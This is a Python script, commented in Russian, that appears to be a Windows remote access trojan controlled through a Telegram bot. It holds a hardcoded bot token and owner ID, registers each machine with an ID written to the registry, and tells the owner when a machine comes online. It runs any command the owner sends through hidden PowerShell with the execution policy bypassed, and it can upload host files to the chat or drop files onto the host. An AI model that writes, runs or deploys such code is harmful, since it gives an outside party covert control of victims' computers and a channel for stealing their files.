import os
import sys
import time
import uuid
import logging
import subprocess
import winreg
import traceback
from datetime import datetime
from pathlib import Path

try:
    import requests
except ImportError:
    print("Установите зависимости: pip install requests")
    sys.exit(1)

# ─── Настройки ──────────────────────────────────────────────────────────────
BT_TN   = "8658508375:AAG373ooDTewffNHYhGN1sHjOj-KhOPTY90"
OWNER_ID    = "7643172580"   # числовой ID владельца
POLL_INTERVAL = 60          # секунд между опросами
ENV_KEY     = "TG_BOT_MACHINE_ID"          # имя переменной окружения для хранения ID
API_BASE    = f"https://api.telegram.org/bot{BT_TN}"
TIMEOUT     = 20            # таймаут HTTP-запросов
RETRY_DELAY = 10            # задержка при сетевых сбоях (сек)
MAX_RETRIES = 5



# ─── Логирование (только консоль) ───────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger(__name__)
 
 
# ─── Работа с реестром Windows (постоянные переменные окружения пользователя) ─
def _reg_key():
    return winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Environment",
        0,
        winreg.KEY_READ | winreg.KEY_WRITE,
    )
 
def get_env_user(name: str) -> str | None:
    """Читает переменную окружения текущего пользователя из реестра."""
    try:
        with _reg_key() as k:
            value, _ = winreg.QueryValueEx(k, name)
            return value
    except FileNotFoundError:
        return None
 
def set_env_user(name: str, value: str) -> None:
    """Сохраняет переменную окружения текущего пользователя в реестр (постоянно)."""
    with _reg_key() as k:
        winreg.SetValueEx(k, name, 0, winreg.REG_SZ, value)
    # Обновляем текущий процесс тоже
    os.environ[name] = value
    log.info(f"Переменная окружения {name} сохранена в реестр.")
 
 
# ─── Управление ID бота ──────────────────────────────────────────────────────
def get_or_create_bot_id() -> tuple[str, bool]:
    """
    Возвращает (bot_id, is_new).
    Если ID нет — генерирует, сохраняет в реестр.
    """
    bot_id = get_env_user(ENV_KEY) or os.environ.get(ENV_KEY)
    if bot_id:
        return bot_id, False
    # Первый запуск
    bot_id = uuid.uuid4().hex[:12]
    set_env_user(ENV_KEY, bot_id)
    return bot_id, True
 
 
# ─── HTTP-запросы с retry ────────────────────────────────────────────────────
def api_request(method: str, **params) -> dict | None:
    """
    Выполняет запрос к Telegram Bot API с повторными попытками при сетевых сбоях.
    """
    url = f"{API_BASE}/{method}"
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            resp = requests.post(url, json=params, timeout=TIMEOUT)
            resp.raise_for_status()
            data = resp.json()
            if not data.get("ok"):
                log.warning(f"API error ({method}): {data.get('description')}")
                return None
            return data
        except requests.exceptions.ConnectionError as e:
            log.warning(f"[{attempt}/{MAX_RETRIES}] Нет соединения ({method}): {e}")
        except requests.exceptions.Timeout:
            log.warning(f"[{attempt}/{MAX_RETRIES}] Таймаут запроса ({method})")
        except requests.exceptions.HTTPError as e:
            log.error(f"HTTP ошибка ({method}): {e}")
            return None
        except Exception as e:
            log.error(f"Неожиданная ошибка ({method}): {e}")
            return None
        if attempt < MAX_RETRIES:
            time.sleep(RETRY_DELAY)
    log.error(f"Все {MAX_RETRIES} попыток исчерпаны для {method}.")
    return None
 
 
def send_message(chat_id: int | str, text: str, parse_mode: str = "") -> None:
    """Отправляет сообщение, разбивая на части если > 4096 символов."""
    max_len = 4000
    for i in range(0, max(1, len(text)), max_len):
        chunk = text[i:i + max_len]
        kwargs = {"chat_id": chat_id, "text": chunk}
        if parse_mode:
            kwargs["parse_mode"] = parse_mode
        api_request("sendMessage", **kwargs)
 
 
def get_updates(offset: int) -> list[dict]:
    """Получает новые апдейты начиная с offset."""
    data = api_request("getUpdates", offset=offset, timeout=30, limit=100)
    if data is None:
        return []
    return data.get("result", [])
 
 
# ─── Выполнение команды ──────────────────────────────────────────────────────
def run_command(cmd: str) -> tuple[str, int, float]:
    """
    Выполняет команду через PowerShell — корректно обрабатывает любые слэши,
    пути с пробелами, cmdlet-ы и произвольные символы.
    """
    log.info(f"Выполнение команды: {cmd}")
    start = time.monotonic()
    try:
        result = subprocess.run(
            [
                "powershell.exe",
                "-NoProfile",
                "-NonInteractive",
                "-ExecutionPolicy", "Bypass",
                "-Command", cmd,
            ],
            shell=False,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=120,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        elapsed = time.monotonic() - start
        output = result.stdout + result.stderr
        return (output.strip() or "(нет вывода)"), result.returncode, elapsed
    except subprocess.TimeoutExpired:
        return "Превышен таймаут выполнения (120 сек)", 1, 120.0
    except Exception as e:
        return f"Ошибка выполнения: {e}", 1, 0.0
 
 
def build_reply(bot_id: str, cmd: str, output: str, returncode: int, elapsed: float) -> str:
    """
    Формирует красиво оформленное сообщение для Telegram (MarkdownV2).
    """
    now = datetime.now().strftime("%d.%m.%Y  %H:%M:%S")
    status = "✅ OK" if returncode == 0 else f"❌ exit {returncode}"
 
    # Экранирование спецсимволов MarkdownV2 в динамических полях
    def esc(s: str) -> str:
        for ch in r"\_*[]()~`>#+-=|{}.!":
            s = s.replace(ch, f"\\{ch}")
        return s
 
    header = (
        f"🖥 `{esc(bot_id)}`\n"
        f"📅 {esc(now)}\n"
        f"⏱ {esc(f'{elapsed:.2f}s')}   {status}\n"
        f"📌 `{esc(cmd)}`\n"
        f"{'—' * 30}"
    )
 
    # Вывод команды — в code-блоке (не экранируем внутри ```)
    body = f"```\n{output}\n```"
 
    return f"{header}\n{body}"
 
 
def send_file(chat_id: int | str, file_path: str) -> None:
    """Отправляет файл пользователю через sendDocument."""
    path = file_path.strip().strip('"').strip("'")
    if not os.path.exists(path):
        send_message(chat_id, f"❌ Файл не найден:\n`{path}`", parse_mode="MarkdownV2")
        return
    if not os.path.isfile(path):
        send_message(chat_id, f"❌ Это не файл:\n`{path}`", parse_mode="MarkdownV2")
        return
 
    size_mb = os.path.getsize(path) / (1024 * 1024)
    if size_mb > 50:
        send_message(chat_id, f"❌ Файл слишком большой ({size_mb:.1f} МБ, лимит 50 МБ)")
        return
 
    log.info(f"Отправка файла: {path} ({size_mb:.2f} МБ)")
    url = f"{API_BASE}/sendDocument"
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            with open(path, "rb") as f:
                resp = requests.post(
                    url,
                    data={"chat_id": chat_id},
                    files={"document": (os.path.basename(path), f)},
                    timeout=60,
                )
            resp.raise_for_status()
            data = resp.json()
            if data.get("ok"):
                log.info("Файл успешно отправлен.")
                return
            else:
                log.warning(f"sendDocument error: {data.get('description')}")
                send_message(chat_id, f"❌ Ошибка отправки: {data.get('description')}")
                return
        except requests.exceptions.ConnectionError:
            log.warning(f"[{attempt}/{MAX_RETRIES}] Нет соединения при отправке файла")
        except requests.exceptions.Timeout:
            log.warning(f"[{attempt}/{MAX_RETRIES}] Таймаут при отправке файла")
        except Exception as e:
            log.error(f"Ошибка отправки файла: {e}")
            send_message(chat_id, f"❌ Ошибка: {e}")
            return
        if attempt < MAX_RETRIES:
            time.sleep(RETRY_DELAY)
    send_message(chat_id, "❌ Не удалось отправить файл — нет соединения.")
 
 
 
def download_file(message: dict, chat_id: int | str, save_dir: str) -> None:
    """
    Скачивает файл который пользователь прислал боту как документ.
    save_dir — папка куда сохранить (по умолчанию Downloads).
    """
    document = message.get("document")
    if not document:
        send_message(chat_id, "❌ Прикрепи файл как документ вместе с командой download.")
        return
 
    file_name = document.get("file_name", "file")
    file_id   = document["file_id"]
    file_size = document.get("file_size", 0)
 
    if file_size > 20 * 1024 * 1024:
        send_message(chat_id, f"❌ Файл слишком большой ({file_size // 1024 // 1024} МБ, лимит 20 МБ через Bot API).")
        return
 
    # Получаем ссылку на файл
    data = api_request("getFile", file_id=file_id)
    if not data:
        send_message(chat_id, "❌ Не удалось получить ссылку на файл.")
        return
 
    file_path_tg = data["result"]["file_path"]
    download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path_tg}"
 
    # Определяем папку сохранения
    save_dir = save_dir.strip().strip('"').strip("'") if save_dir else ""
    if not save_dir:
        save_dir = os.path.join(os.path.expanduser("~"), "Downloads")
    os.makedirs(save_dir, exist_ok=True)
 
    save_path = os.path.join(save_dir, file_name)
 
    log.info(f"Скачивание файла: {file_name} -> {save_path}")
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            resp = requests.get(download_url, timeout=60, stream=True)
            resp.raise_for_status()
            with open(save_path, "wb") as f:
                for chunk in resp.iter_content(chunk_size=8192):
                    f.write(chunk)
            size_kb = os.path.getsize(save_path) / 1024
            send_message(
                chat_id,
                f"✅ Файл сохранён\n📄 `{file_name}`\n📁 `{save_path}`\n💾 {size_kb:.1f} КБ",
                parse_mode="MarkdownV2",
            )
            return
        except requests.exceptions.ConnectionError:
            log.warning(f"[{attempt}/{MAX_RETRIES}] Нет соединения при скачивании")
        except requests.exceptions.Timeout:
            log.warning(f"[{attempt}/{MAX_RETRIES}] Таймаут при скачивании")
        except Exception as e:
            log.error(f"Ошибка скачивания: {e}")
            send_message(chat_id, f"❌ Ошибка скачивания: {e}")
            return
        if attempt < MAX_RETRIES:
            time.sleep(RETRY_DELAY)
    send_message(chat_id, "❌ Не удалось скачать файл — нет соединения.")
 
 
def process_message(update: dict, bot_id: str, owner_id: str) -> None:
    message = update.get("message") or update.get("edited_message")
    if not message:
        return
 
    chat_id   = message["chat"]["id"]
    sender_id = str(message["from"]["id"])
 
    # Текст может быть в text (обычное) или caption (документ с подписью)
    text = (message.get("text") or message.get("caption") or "").strip()
 
    log.info(f"Сообщение от {sender_id}: {text!r}")
 
    # 1) Проверка отправителя
    if sender_id != owner_id:
        send_message(chat_id, "permission error")
        log.warning(f"Отказано: неизвестный отправитель {sender_id}")
        return
 
    # 2) Проверка формата: должно начинаться с id-<bot_id>
    expected_prefix = f"id-{bot_id}"
    if not text.startswith(expected_prefix):
    #   send_message(chat_id, "id error")
        log.warning(f"Отказано: неверный prefix. Ожидалось: {expected_prefix!r}")
        return
 
    # 3) Извлечение команды
    raw_cmd = text[len(expected_prefix):].strip()
    if not raw_cmd:
        send_message(chat_id, "Ошибка: пустая команда.")
        return
 
    # 4) Спецкоманда: upload <путь>  — отправить файл с хоста в чат
    if raw_cmd.lower().startswith("upload "):
        file_path = raw_cmd[7:].strip()
        send_file(chat_id, file_path)
        return
 
    # 5) Спецкоманда: download [папка]  — сохранить присланный документ на хост
    #    Пользователь присылает файл с подписью "id-xxx download C:\some\dir"
    if raw_cmd.lower().startswith("download"):
        save_dir = raw_cmd[8:].strip()
        download_file(message, chat_id, save_dir)
        return
 
    # 6) Выполнение shell-команды
    output, returncode, elapsed = run_command(raw_cmd)
 
    # 7) Отправка результата
    reply = build_reply(bot_id, raw_cmd, output, returncode, elapsed)
    send_message(chat_id, reply, parse_mode="MarkdownV2")
 
 
# ─── Главный цикл ────────────────────────────────────────────────────────────
def main() -> None:
    if BT_TN == "YOUR_BOT_TOKEN_HERE":
        print("Установите TG_BOT_TOKEN и TG_OWNER_ID в переменные окружения или в код!")
        sys.exit(1)
 
    bot_id, is_new = get_or_create_bot_id()
    owner_id = OWNER_ID
 
    log.info(f"Бот запущен. ID: {bot_id} | Владелец: {owner_id}")
 
    # Уведомление о запуске
    if is_new:
        notice = f"🆕 new user id-{bot_id}"
        log.info(f"Первый запуск, отправка уведомления: {notice}")
    else:
        notice = f"✅ id-{bot_id} online"
        log.info(f"Повторный запуск, отправка уведомления: {notice}")
 
    # Пробуем отправить уведомление (несколько попыток если нет сети)
    for _ in range(MAX_RETRIES):
        data = api_request("sendMessage", chat_id=owner_id, text=notice)
        if data:
            break
        log.warning(f"Не удалось отправить уведомление, повтор через {RETRY_DELAY}с…")
        time.sleep(RETRY_DELAY)
 
    # Отматываем к последнему апдейту, чтобы не обрабатывать старые сообщения
    offset = 0
    data = api_request("getUpdates", offset=-1, limit=1)
    if data and data.get("result"):
        offset = data["result"][-1]["update_id"] + 1
 
    log.info(f"Начинаю polling с offset={offset}, интервал={POLL_INTERVAL}с")
 
    while True:
        try:
            updates = get_updates(offset)
            for update in updates:
                try:
                    process_message(update, bot_id, owner_id)
                except Exception as e:
                    log.error(f"Ошибка обработки апдейта: {e}\n{traceback.format_exc()}")
                offset = update["update_id"] + 1
 
        except Exception as e:
            log.error(f"Ошибка в главном цикле: {e}\n{traceback.format_exc()}")
 
        time.sleep(POLL_INTERVAL)
 
 
if __name__ == "__main__":
    main()
